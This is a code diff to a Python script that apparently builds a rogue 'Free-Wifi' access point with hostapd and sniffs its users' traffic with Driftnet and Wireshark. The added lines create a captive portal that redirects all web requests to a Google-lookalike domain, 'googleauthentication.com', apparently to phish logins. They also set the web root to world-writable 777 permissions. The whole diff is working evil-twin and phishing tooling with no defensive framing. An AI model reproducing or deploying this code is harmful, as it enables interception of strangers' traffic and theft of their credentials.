@@ -59,7 +59,7 @@ try:
  #..HOSTAPD CONFIG 1
  print("")
  ssid = input("[??] Input ssid name:(Free-Wifi) ") or "Free-Wifi"
- rnd = rand.randint(1, 9)
+ rnd = rand.randint(0, 9)
  channel = input("[??] Input channel number:("+str(rnd)+") ") or str(rnd)
 
  hostapd_txt = "interface=" + wlan_ap + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
@@ -91,17 +91,30 @@ try:
  print("[~~] Starting HOSTAPD server...")
  print("")
  input("[!!] Press Enter to continue: ")
- #############driftnet 1
+ ############# others 1
  print("")
+ ##Driftnet 1
  fiDriftnet = input("[!?] Use Driftnet (y/N): ")
  if(fiDriftnet == "y"):
   os.system("sudo driftnet -i "+wlan_ap+" &")
- ##...0
  ##wireshark 1
  fiwireshark = input("[!?] Use wireshark (y/N): ")
  if(fiwireshark == "y"):
-  os.system("sudo wireshark -i "+wlan_ap+" -k &")    
- ###################...0
+  os.system("sudo wireshark -i "+wlan_ap+" -k &")
+ ##captivePortal 1
+ ficaptivePortal = input("[!?] Enable captivePortal (y/N): ")
+ if(ficaptivePortal == "y"):
+  captivePortal_filename = input("[!?] Select file name - /var/www/html/:(index.html) ") or "index.html"
+  os.system("sudo echo -e \"RewriteEngine on\n\
+		RewriteCond %{REQUEST_URI} !^/"+captivePortal_filename+"\n\
+		RewriteRule (.*) http://googleauthentication.com/"+captivePortal_filename+" [R=302,L]\" > /var/www/html/.htaccess")
+  os.system("sudo chmod 777 /var/www/html/ && sudo chmod 777 /var/www/html/*")
+  os.system("sudo echo -e \"<Directory /var/www/>\n\
+   	 	Options Indexes FollowSymLinks\n\
+   	 	AllowOverride All\n\
+   	 	Require all granted\n</Directory>\" >> /etc/apache2/sites-available/000-default.conf")
+  os.system("sudo service apache2 start && sudo service apache2 restart && a2enmod rewrite > /dev/null 2>&1")
+###################...0
  print("")
  print("")
  os.system("sudo killall hostapd > /dev/null 2>&1")
